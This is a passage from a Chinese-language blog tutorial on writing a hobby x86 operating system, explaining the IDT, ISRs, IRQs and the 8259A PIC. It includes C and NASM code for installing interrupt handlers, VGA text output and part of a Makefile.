class="type">uint8_t</span>  type_attr;    <span class="comment">// Type and attributes</span></span><br><span class="line">    <span class="type">uint16_t</span> offset_high;  <span class="comment">// Offset bits 16-31</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_ptr</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> limit;     <span class="comment">// size</span></span><br><span class="line">    <span class="type">uint32_t</span> base;      <span class="comment">// offset</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_set_gate</span><span class="params">(<span class="type">int</span> num, <span class="type">uint32_t</span> base, <span class="type">uint16_t</span> sel, <span class="type">uint8_t</span> flags)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_install</span><span class="params">()</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="中断向量">中断向量</h4>
<p>大多数平台上通常有三类中断：</p>
<ul>
<li><p><strong>异常 </strong>：这些异常由 CPU
内部生成，用于向正在运行的内核发出需要其注意的事件或情况的警报。在 x86
CPU 上，这些异常包括双重异常（Double Fault）、缺页异常（Page
Fault）、通用保护异常（General Protection Fault）等。</p></li>
<li><p><strong>中断请求 (IRQ) 或硬件中断</strong>
：此类中断由芯片组外部生成，并通过锁存相关 CPU 的 #INTR
引脚或等效信号来发出信号。目前常用的 IRQ 类型有两种。</p>
<ul>
<li><p><strong>IRQ 线路</strong>，或基于引脚的 IRQ ：这些 IRQ
通常在芯片组上静态路由。线路从芯片组上的设备连接到 <a class="link" 
 href="https://wiki.osdev.org/index.php?title=IRQ_controller&amp;action=edit&amp;redlink=1" >IRQ
控制器<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，该控制器将设备发送的中断请求序列化，并将它们逐个发送到
CPU，以防止争用。在许多情况下，IRQ 控制器会根据设备的优先级一次向 CPU
发送多个 IRQ。</p></li>
<li><p><strong>消息信号中断</strong>
：这些中断通过向一个预留的内存位置写入值来发出信号，该位置用于存储中断设备、中断本身以及向量信息。设备会通过固件或内核软件分配一个写入位置。然后，设备会使用特定于设备总线的仲裁协议生成
IRQ。PCI 总线就是一个提供基于消息的中断功能的总线示例。</p></li>
</ul></li>
<li><p><strong>软件中断</strong> ：这是由 CPU
上运行的软件发出的中断信号，表示需要内核的关注。这类中断通常用于<a class="link" 
 href="https://wiki.osdev.org/System_Calls" >系统调用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。在 x86 CPU
上，用于启动软件中断的指令是“INT”指令。由于 x86 CPU 可以使用 256
个可用中断向量中的任意一个来处理软件中断，因此内核通常会从中选择一个。例如，许多当代
Unix 系统在基于 x86 的平台上使用向量 0x80。</p></li>
</ul>
<p>中断号由8个二进制位表示，范围在0-255，其中前32个中断（异常）是
<strong>CPU 固定写死的</strong>。比如除以0了，CPU 就会主动触发
<strong>中断 0</strong>。我们<strong>不能更改 CPU
生成的中断号。</strong>但我们可以“改响应方式”，比如说你在 IDT 表的第 0
项，挂一个你自己的 <code>isr0</code> 函数，去处理除零异常。但不能让 CPU
改为跳转到 IDT 第 9 项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250507194758737.png"
                      class=""
                >
<h4 id="isrinterrupt-service-routines">ISR（Interrupt Service
Routines）</h4>
<p>外部事件会触发中断——正常的控制流会被打断，并调用<strong>中断服务程序</strong>
(ISR)。可以说ISR</p>
<p>ISR 必须以操作码 <code>iret</code>
结尾，所以我们在用<strong>idt_set_gate</strong>设置某个<strong>IDT</strong>表项时，需要将base设置为一个以<strong>iret</strong>结束的函数，所以一般是写汇编来包装<strong>ISR</strong>，不能直接设置base为回调函数的地址。</p>
<h4 id="irqinterrupt-request">IRQ（Interrupt Request）</h4>
<p><strong>IRQ 是硬件设备向 CPU 请求服务的信号编号。</strong></p>
<p>每一个外设（例如键盘、鼠标、硬盘）在需要 CPU 服务时，会通过某个
<strong>IRQ 线路</strong> 向 CPU 发出中断信号，CPU
处理这个中断，称为“中断服务”。IRQ
是“硬件视角”的编号，它最终会被映射成“软件中的中断号”（即 int
N）。标准的IRQ如下：</p>
<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 93%" />
</colgroup>
<thead>
<tr>
<th>IRQ</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Programmable Interrupt Timer Interrupt</td>
</tr>
<tr>
<td>1</td>
<td>Keyboard Interrupt</td>
</tr>
<tr>
<td>2</td>
<td>Cascade (used internally by the two PICs. never raised)</td>
</tr>
<tr>
<td>3</td>
<td>COM2 (if enabled)</td>
</tr>
<tr>
<td>4</td>
<td>COM1 (if enabled)</td>
</tr>
<tr>
<td>5</td>
<td>LPT2 (if enabled)</td>
</tr>
<tr>
<td>6</td>
<td>Floppy Disk</td>
</tr>
<tr>
<td>7</td>
<td>LPT1 / Unreliable <a class="link" 
 href="https://wiki.osdev.org/8259_PIC#Spurious_IRQs" >"spurious"
interrupt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (usually)</td>
</tr>
<tr>
<td>8</td>
<td>CMOS real-time clock (if enabled)</td>
</tr>
<tr>
<td>9</td>
<td>Free for peripherals / legacy SCSI / NIC</td>
</tr>
<tr>
<td>10</td>
<td>Free for peripherals / SCSI / NIC</td>
</tr>
<tr>
<td>11</td>
<td>Free for peripherals / SCSI / NIC</td>
</tr>
<tr>
<td>12</td>
<td>PS2 Mouse</td>
</tr>
<tr>
<td>13</td>
<td>FPU / Coprocessor / Inter-processor</td>
</tr>
<tr>
<td>14</td>
<td>Primary ATA Hard Disk</td>
</tr>
<tr>
<td>15</td>
<td>Secondary ATA Hard Disk</td>
</tr>
</tbody>
</table>
<h4 id="picprogrammable-interrupt-controller">PIC（Programmable
Interrupt Controller）</h4>
<p>最早的 PC 使用两个 <strong>8259A PIC（主从）</strong> 来管理
<strong>15 个 IRQ 通道（IRQ0 ~ IRQ15）</strong>。</p>
<ul>
<li>主 PIC 处理 IRQ0 ~ IRQ7</li>
<li>从 PIC 处理 IRQ8 ~ IRQ15，并通过 IRQ2 接到主 PIC 的 IRQ2 上</li>
</ul>
<p>异常向量对照表</p>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 89%" />
</colgroup>
<thead>
<tr>
<th>Int</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0-31</td>
<td><a class="link"   href="https://wiki.osdev.org/Protected_Mode" >Protected Mode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>
Exceptions (Reserved by Intel)</td>
</tr>
<tr>
<td>8-15</td>
<td>Default mapping of IRQ0-7 by the BIOS at bootstrap</td>
</tr>
<tr>
<td>70h-78h</td>
<td>Default mapping of IRQ8-15 by the BIOS at bootstrap</td>
</tr>
</tbody>
</table>
<h4 id="pic-的控制端口port">PIC 的控制端口（Port）</h4>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 86%" />
</colgroup>
<thead>
<tr>
<th>Port</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>20h &amp; 21h</td>
<td>control/mask ports of the master PIC</td>
</tr>
<tr>
<td>A0h &amp; A1h</td>
<td>control/mask ports of the slave PIC</td>
</tr>
<tr>
<td>60h</td>
<td>data port from the keyboard controller</td>
</tr>
<tr>
<td>64h</td>
<td>command port for keyboard controller - use to enable/disable kbd
interrupts, etc.</td>
</tr>
</tbody>
</table>
<h4 id="io控制指令">I/O控制指令</h4>
<p><code>outb / inb</code>这两个是 <strong>x86 架构提供的底层 I/O
指令</strong>，用于与<strong>外设通信</strong>，比如：<strong>可编程中断控制器（PIC）</strong>，<strong>定时器（PIT）</strong>，<strong>键盘控制器</strong>，<strong>CMOS</strong>，甚至是串口、VGA
等等</p>
<p><strong>outb(port, value)</strong></p>
<ul>
<li><strong>作用</strong>：把一个字节（<code>value</code>）写到某个 I/O
端口（<code>port</code>）</li>
<li><strong>汇编对应</strong>：<code>outb %al, %dx</code> 这里
<code>%al</code> 是 8 位寄存器，<code>%dx</code> 是 I/O 端口号</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;outb %0, %1&quot;</span> : : <span class="string">&quot;a&quot;</span>(val), <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>解释：</strong></p>
<ul>
<li><code>asm volatile (...)</code>:
告诉编译器这是内联汇编，且不要优化或重排序</li>
<li><code>"a"(val)</code>: 把 <code>val</code> 放到
<code>eax</code>/<code>al</code> 寄存器</li>
<li><code>"Nd"(port)</code>: 把 <code>port</code> 放到
<code>dx</code>，或立即数（<code>N</code> 表示 0–255 的立即数）</li>
</ul>
<p><strong>inb(port)</strong></p>
<ul>
<li><strong>作用</strong>：从某个 I/O
端口（<code>port</code>）读取一个字节</li>
<li><strong>汇编对应</strong>：<code>inb %dx, %al</code></li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;inb %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>"=a"(ret)</code>: 将 <code>al</code> 中的值存到
<code>ret</code></li>
<li><code>"Nd"(port)</code>: <code>port</code> 放到 <code>dx</code>
或立即数</li>
</ul>
<p>初始化 PIC 需要发 4 条命令（<strong>ICW1 ~
ICW4</strong>），<strong>ICW</strong>即<strong>Initialization Command
Word</strong>：</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 41%" />
<col style="width: 49%" />
</colgroup>
<thead>
<tr>
<th>控制字</th>
<th>用途</th>
<th>对应 <code>outb()</code> 调用</th>
</tr>
</thead>
<tbody>
<tr>
<td>ICW1</td>
<td>发起初始化</td>
<td><code>outb(PICx_COMMAND, ICW1_INIT)</code></td>
</tr>
<tr>
<td>ICW2</td>
<td>设置中断向量偏移</td>
<td><code>outb(PICx_DATA, 0x20 / 0x28)</code></td>
</tr>
<tr>
<td>ICW3</td>
<td>设置主从连接方式</td>
<td><code>outb(PICx_DATA, 4 / 2)</code></td>
</tr>
<tr>
<td>ICW4</td>
<td>设置 PIC 模式（8086 模式）</td>
<td><code>outb(PICx_DATA, ICW4_8086)</code></td>
</tr>
</tbody>
</table>
<p>这些 <strong>必须按顺序喂给 PIC</strong>，否则它无法正确配置。</p>
<h3 id="基本简单实现">基本简单实现</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// idt.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDT_ENTRIES 256</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_entry</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> offset_low;   <span class="comment">// Offset bits 0-15</span></span><br><span class="line">    <span class="type">uint16_t</span> selector;     <span class="comment">// Kernel segment selector</span></span><br><span class="line">    <span class="type">uint8_t</span>  zero;         <span class="comment">// Always 0</span></span><br><span class="line">    <span class="type">uint8_t</span>  type_attr;    <span class="comment">// Type and attributes</span></span><br><span class="line">    <span class="type">uint16_t</span> offset_high;  <span class="comment">// Offset bits 16-31</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_ptr</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> limit;     <span class="comment">// size</span></span><br><span class="line">    <span class="type">uint32_t</span> base;      <span class="comment">// offset</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_set_gate</span><span class="params">(<span class="type">int</span> num, <span class="type">uint32_t</span> base, <span class="type">uint16_t</span> sel, <span class="type">uint8_t</span> flags)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_install</span><span class="params">()</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// idt.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_entry</span> <span class="title">idt</span>[<span class="title">IDT_ENTRIES</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_ptr</span> <span class="title">idtp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">idt_flush</span><span class="params">(<span class="type">uint32_t</span>)</span>;  <span class="comment">// 来自汇编</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_set_gate</span><span class="params">(<span class="type">int</span> num, <span class="type">uint32_t</span> base, <span class="type">uint16_t</span> sel, <span class="type">uint8_t</span> flags)</span> &#123;</span><br><span class="line">    idt[num].offset_low = base &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    idt[num].selector = sel;</span><br><span class="line">    idt[num].zero = <span class="number">0</span>;</span><br><span class="line">    idt[num].type_attr = flags;</span><br><span class="line">    idt[num].offset_high = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_install</span><span class="params">()</span> &#123;</span><br><span class="line">    idtp.limit = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> idt_entry) * IDT_ENTRIES - <span class="number">1</span>;</span><br><span class="line">    idtp.base = (<span class="type">uint32_t</span>)&amp;idt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IDT_ENTRIES; i++) &#123;</span><br><span class="line">        <span class="comment">// 清空，初始化时所有参数为 0，但是由于flags位的P也为0，所以CPU会忽略该中断，访问未定义的中断时不会导致系统重启</span></span><br><span class="line">        idt_set_gate(i, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isr_install();  <span class="comment">// 安装 ISR 0-31</span></span><br><span class="line"></span><br><span class="line">    idt_flush((<span class="type">uint32_t</span>)&amp;idtp);         <span class="comment">// 刷新 IDT</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// isr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">registers</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> ds, edi, esi, ebp, esp, ebx, edx, ecx, eax;</span><br><span class="line">    <span class="type">uint32_t</span> int_no, err_code;</span><br><span class="line">    <span class="type">uint32_t</span> eip, cs, eflags, useresp, ss;</span><br><span class="line">&#125; <span class="type">registers_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// isr.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">isr0</span><span class="params">()</span>;  <span class="comment">// 在汇编中定义的 isr 函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span> &#123;</span><br><span class="line">    idt_set_gate(<span class="number">0</span>, (<span class="type">uint32_t</span>)isr0, <span class="number">0x08</span>, <span class="number">0x8E</span>);  <span class="comment">// 设置除 0 异常处理函数</span></span><br><span class="line">    <span class="comment">// 后续你可以添加 isr1-isr31</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(<span class="type">registers_t</span> *regs)</span> &#123;</span><br><span class="line">    print_string(<span class="string">&quot;Received interrupt: &quot;</span>);</span><br><span class="line">    print_hex(regs-&gt;int_no);  <span class="comment">// 自己写的打印 hex 函数</span></span><br><span class="line">    print_newline();</span><br><span class="line">    print_string(<span class="string">&quot;Counter: &quot;</span>);</span><br><span class="line">    print_dec(<span class="number">12345</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// screen.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_char</span><span class="params">(<span class="type">char</span> c)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_newline</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_dec</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// screen.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIDEO_MEMORY (unsigned short *)0xB8000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_COLS 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ROWS 25</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cursor_x = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cursor_y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">update_cursor_pos</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cursor_x &gt;= MAX_COLS) &#123;</span><br><span class="line">        cursor_x = <span class="number">0</span>;</span><br><span class="line">        cursor_y++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cursor_y &gt;= MAX_ROWS) &#123;</span><br><span class="line">        <span class="comment">// 暂时不做滚动，直接从顶部开始</span></span><br><span class="line">        cursor_x = <span class="number">0</span>;</span><br><span class="line">        cursor_y = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = VIDEO_MEMORY;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span> * <span class="number">25</span>; i++) &#123;</span><br><span class="line">        video[i] = <span class="number">0x0F20</span>;  <span class="comment">// 清屏，0x0F 是前景色，0x20 是空格</span></span><br><span class="line">    &#125;</span><br><span class="line">    cursor_x = <span class="number">0</span>;</span><br><span class="line">    cursor_y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_char</span><span class="params">(<span class="type">char</span> c)</span> &#123;           <span class="comment">// 打印一个字符</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = VIDEO_MEMORY;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        cursor_x = <span class="number">0</span>;</span><br><span class="line">        cursor_y++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pos = cursor_y * MAX_COLS + cursor_x;</span><br><span class="line">        video[pos] = (<span class="number">0x0F</span> &lt;&lt; <span class="number">8</span>) | c;</span><br><span class="line">        cursor_x++;</span><br><span class="line">    &#125;</span><br><span class="line">    update_cursor_pos();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        print_char(*str++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_newline</span><span class="params">()</span> &#123;</span><br><span class="line">    print_char(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_dec</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">        print_char(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        print_char(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        num = -num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buf[i++] = <span class="string">&#x27;0&#x27;</span> + (num % <span class="number">10</span>);</span><br><span class="line">        num /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        print_char(buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    print_string(<span class="string">&quot;0x&quot;</span>);</span><br><span class="line">    <span class="type">char</span> hex_chars[] = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">28</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">4</span>) &#123;</span><br><span class="line">        print_char(hex_chars[(num &gt;&gt; i) &amp; <span class="number">0xF</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; idt_flush.asm</span><br><span class="line">global idt_flush</span><br><span class="line">idt_flush:</span><br><span class="line">    mov eax, [esp+4] ; 参数：&amp;idtp</span><br><span class="line">    lidt [eax]</span><br><span class="line">    ret</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; isr_stub.asm</span><br><span class="line">global isr0</span><br><span class="line">extern isr_handler</span><br><span class="line"></span><br><span class="line">isr0:</span><br><span class="line">    cli</span><br><span class="line">    push 0          ; error code</span><br><span class="line">    push 0          ; int number</span><br><span class="line">    jmp isr_common_stub</span><br><span class="line"></span><br><span class="line">isr_common_stub:</span><br><span class="line">    pusha</span><br><span class="line">    mov ax, ds</span><br><span class="line">    push eax</span><br><span class="line">    mov ax, 0x10        ; data segment selector</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line"></span><br><span class="line">    push esp</span><br><span class="line">    call isr_handler</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    pop eax</span><br><span class="line">    popa</span><br><span class="line">    add esp, 8</span><br><span class="line">    sti</span><br><span class="line">    iret</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line">DIR := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">BOOT_DIR := <span class="variable">$(DIR)</span>/boot</span><br><span class="line">KERNEL_DIR := <span class="variable">$(DIR)</span>/kernel</span><br><span class="line">DRIVER_DIR := <span class="variable">$(DIR)</span>/drivers</span><br><span class="line">ARCH_DIR := <span class="variable">$(DIR)</span>/arch/x86</span><br><span class="line">LINK_LD := <span class="variable">$(DIR)</span>/linker.ld</span><br><span class="line">TARGET := <span class="variable">$(DIR)</span>/focus-os.img</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中间产物</span></span><br><span class="line">BOOT_BIN := boot.bin</span><br><span class="line">STAGE2_BIN := stage2.bin</span><br><span class="line">KERNEL_ELF := kernel.elf</span><br><span class="line">KERNEL_BIN := kernel.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取所有 .asm 文件</span></span><br><span class="line">ASM_SRCS := <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(ARCH_DIR)</span>/*.asm)</span></span><br><span class="line">ASM_OBJS := <span class="variable">$(<span class="built_in">patsubst</span> %.asm,%.o,<span class="variable">$(ASM_SRCS)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取所有 .c 和 .h 文件</span></span><br><span class="line">KERNEL_SRC := <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(KERNEL_DIR)</span>/*.c)</span> <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(DRIVER_DIR)</span>/*.c)</span></span><br><span class="line"><span class="comment"># 必须让kernel在第一个加载，从而可以直接跳转到kernel_main</span></span><br><span class="line">KERNEL_OBJ := <span class="variable">$(KERNEL_DIR)</span>/kernel.o <span class="variable">$(<span class="built_in">filter</span>-out <span class="variable">$(KERNEL_DIR)</span>/kernel.o, $(KERNEL_SRC:.c=.o)</span>) <span class="variable">$(ASM_OBJS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译器设置</span></span><br><span class="line">CC := gcc</span><br><span class="line">CFLAGS := -m32 -g -ffreestanding -fno-pie -fno-stack-protector -nostdlib -nostartfiles -I<span class="variable">$(KERNEL_DIR)</span> -I<span class="variable">$(DRIVER_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: all clean run</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BOOT_BIN)</span>: <span class="variable">$(BOOT_DIR)</span>/boot.asm</span><br><span class="line">	nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(STAGE2_BIN)</span>: <span class="variable">$(BOOT_DIR)</span>/stage2.asm</span><br><span class="line">	nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译内核每个 .c 文件</span></span><br><span class="line"><span class="variable">$(KERNEL_DIR)</span>/%.o: <span class="variable">$(KERNEL_DIR)</span>/%.c</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c <span 